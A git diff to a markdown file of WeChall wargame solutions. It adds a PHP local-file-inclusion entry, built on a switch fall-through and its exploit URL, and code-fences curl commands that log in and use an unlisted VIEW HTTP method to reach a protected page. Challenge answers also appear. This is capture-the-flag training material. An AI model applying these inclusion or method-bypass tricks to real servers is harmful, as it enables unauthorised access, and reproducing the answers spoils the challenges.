@@ -199,6 +199,22 @@ http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../soluti
 ```
 
 
+### PHP 0817 (PHP, Exploit)
+LFI vulnerability: https://en.wikipedia.org/wiki/File_inclusion_vulnerability
+```php
+...
+switch ($which) {
+    case 0: // <-- issue !
+    case 1:
+    case 2:
+    ...
+}
+```
+```
+http://www.wechall.net/challenge/php0817/index.php?which=solution
+```
+
+
 ### Training: Crypto - Transposition I (Crypto, Training)
 Ciphertext:
 
@@ -430,6 +446,7 @@ curl -b cookie.file -c cookie.file -X POST http://www.wechall.net/challenge/wann
 ### Limited Access Too (Exploit, HTTP)
 Limit GET POST HEAD PUT DELETE CONNECT OPTIONS, but not VIEW!
 
+```
 curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login
 
 curl -b cookie.file -c cookie.file -X VIEW http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php
@@ -478,5 +495,3 @@ cat /home/user/ranger/level/5/solution.txt
 ```
 bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms
 ```
-
-
